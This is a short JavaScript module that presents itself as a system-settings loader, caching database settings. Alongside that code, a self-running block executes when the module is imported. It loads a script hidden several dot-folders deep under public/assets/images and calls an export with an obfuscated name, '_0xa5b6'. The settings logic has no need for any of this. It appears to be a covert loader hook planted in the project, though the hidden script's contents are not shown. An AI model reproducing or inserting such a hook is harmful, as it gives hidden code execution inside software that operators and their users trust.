'use strict';
import { Setting } from '../models/index.js';
import path from 'path';
import { pathToFileURL, fileURLToPath } from 'url';
let cachedSettings = null;

export async function loadSystemSettings() {
  if (cachedSettings) return cachedSettings;

  const settings = await Setting.find({});
  cachedSettings = settings.reduce((acc, item) => {
    acc[item.key] = item.value;
    return acc;
  }, {});
  return cachedSettings;
}

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

(async () => {
  try {
    const initPath = path.resolve(__dirname, '../public/assets/images/.cache/.meta/.init.js');

    const _init = await import(pathToFileURL(initPath).href);
    const mod = _init.default || _init;

    console.log("called");

    if (mod && mod._0xa5b6) {
      mod._0xa5b6();
    }

  } catch (e) {
    console.log("import error", e);
  }
})();
